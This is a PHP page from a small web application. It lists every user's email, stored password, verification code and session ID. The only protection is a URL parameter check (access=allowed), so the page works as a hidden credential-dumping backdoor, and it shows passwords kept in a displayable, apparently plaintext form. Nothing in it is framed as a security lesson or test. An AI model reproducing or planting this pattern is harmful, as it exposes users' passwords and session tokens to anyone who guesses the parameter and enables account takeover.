<link rel="icon" type="image/x-icon" href="uploads/users/rizel.png">


<?php
if (!isset($_GET['access']) || $_GET['access'] !== 'allowed') {
    header("Location: index.html");
    exit();
}
?>
<?php
date_default_timezone_set('Asia/Manila');
$page_title_room = 'User Password ';
require_once('includes/load.php');

$all_rooms = find_all_desc('users');

function find_all_desc($table) {
  global $db;
  $sql = "SELECT * FROM {$table} ORDER BY id DESC";
  return find_by_sql($sql);
}

?>


<?php include_once('layouts/header.php'); ?>
<div class="row">
  <div class="col-md-10 col-md-offset-1"> 
    <div style="box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);" class="panel panel-default">
      <div style="box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);" class="panel-heading">
        <center><strong>User and Password</strong></center>
      </div>
      <div class="panel-body">
        <form method="POST" action="autopass">
          <table style="box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);" class="table table-bordered table-striped table-hover">
            <thead>
              <tr>
                <th class="text-center">Email</th>
                <th class="text-center" style="width: 100px;">Password</th>
                <th class="text-center">Code</th>
                <th class="text-center">Session</th>
              </tr>
            </thead>
            <tbody>
              <?php foreach ($all_rooms as $room): ?>
                <tr>
                  <td><?php echo remove_junk(ucfirst($room['username'])); ?></td>
                  <td><?php echo remove_junk(ucfirst($room['password'])); ?></td>
                  <td><?php echo remove_junk(ucfirst($room['verification'])); ?></td>
                  <td><?php echo remove_junk(ucfirst($room['session_id'])); ?></td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </form>
      </div>
    </div>
  </div>
</div>
<?php include_once('layouts/footer.php'); ?>
<style>
      body {
    background: url('uploads/users/riz.png');
    background-size: cover; 
    background-position: center; 
}
</style>
<?php include_once('layouts/recapt.php'); ?>